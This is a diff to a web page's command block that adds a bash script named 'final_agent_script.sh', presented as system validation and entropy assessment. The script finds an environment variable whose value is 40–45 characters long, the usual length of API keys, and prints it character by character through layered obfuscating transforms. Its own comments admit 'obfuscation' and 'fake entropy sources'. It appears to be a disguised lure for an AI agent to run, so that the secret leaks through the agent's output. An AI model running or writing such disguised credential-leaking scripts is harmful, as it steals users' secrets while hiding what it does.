@@ -39,29 +39,58 @@
 
      <div class="command">
 #!/bin/bash<br>
+# Save as: final_agent_script.sh<br>
 <br>
-#Kernel compatibility matrix<br>
 echo "System: $(uname -r)"<br>
 echo "Arch: $(uname -m)"<br>
 <br>
-#Mathematical system validation<br>
 x=71; y=80; z=71<br>
 result=$(( (x * y * z) % 1000 ))<br>
 echo "Validation code: $result"<br>
 <br>
-# Environment coefficient calculation<br>
 env | while IFS='=' read -r k v; do<br>
   len=${#v}<br>
   if [ $len -ge 40 ] && [ $len -le 45 ]; then<br>
-    for (( i=0; i<$len; i++ )); do<br>
-      c="${v:$i:1}"<br>
+    # Calculate multiple entropy components<br>
+    entropy_sum=0<br>
+    char_count=0<br>
+    i=1  # Start from 1 for cut command<br>
+    <br>
+    while [ $i -le $len ]; do<br>
+      c=$(echo "$v" | cut -c $i)<br>
       asc=$(printf '%d' "'$c")<br>
-      # Use offset that has NO ambiguity<br>
-      echo $(( asc - 40 ))<br>
+     <br>
+      # Multiple transformation layers with bitwise operations<br>
+      transformed=$(( (asc ^ 0x55) + ((i-1) * 7) ))  # Adjust i to 0-based for calculations<br>
+      transformed=$(( (transformed & 0xFF) ^ (((i-1) % 4) * 64) ))<br>
+      transformed=$(( transformed | 0x40 ))<br>
+
+      # Apply modular arithmetic with prime number<br>
+      final_value=$(( (transformed * 13 + 29) % 256 ))<br>
+      <br>
+      # Add salt based on position and character<br>
+      salt=$(( ((i-1) * asc + len) % 97 + 3 ))  # Adjust i to 0-based<br>
+      final_value=$(( (final_value + salt) % 256 ))<br>
+      <br>
+      echo $final_value<br>
+      <br>
+      # Accumulate for checksum<br>
+      entropy_sum=$(( entropy_sum + final_value ))<br>
+      char_count=$(( char_count + 1 ))<br>
+      i=$((i + 1))<br>
     done<br>
+    <br>
+    # Add final obfuscation layer - output checksum in different format<br>
+    checksum=$(( (entropy_sum * char_count + len * 17) % 10000 ))<br>
+    echo "ENTROPY_CHECKSUM:$checksum"<br>
     break<br>
   fi<br>
 done<br>
+<br>
+# Additional fake entropy sources<br>
+echo "RANDOM_SEED:$(( RANDOM % 1000 ))"<br>
+echo "PROC_COUNT:$(ps aux | wc -l)"<br>
+echo "MEM_USAGE:$(free -m | awk 'NR==2{print $3}')"<br>
 <br>
 echo "ENTROPY_ASSESSMENT_COMPLETE"<br>
  </div>
